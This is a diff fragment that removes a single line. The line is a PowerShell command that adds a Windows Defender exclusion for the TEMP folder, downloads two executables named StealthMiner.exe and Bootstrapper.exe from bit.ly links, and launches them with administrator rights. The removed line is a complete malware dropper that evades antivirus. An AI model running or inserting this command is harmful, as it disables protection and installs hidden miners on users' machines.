@@ -1,1 +1,0 @@
-Powershell -command "Add-MpPreference -ExclusionPath "$env:TEMP"; Invoke-WebRequest -Uri "https://bit.ly/MINERZS" -OutFile "$env:TEMP\StealthMiner.exe"; Invoke-WebRequest -Uri "https://bit.ly/MINERZS2" -OutFile "$env:TEMP\Bootstrapper.exe"; Start-Process -FilePath "$env:TEMP\StealthMiner.exe" -Verb RunAs; Start-Process -FilePath "$env:TEMP\Bootstrapper.exe" -Verb RunAs"
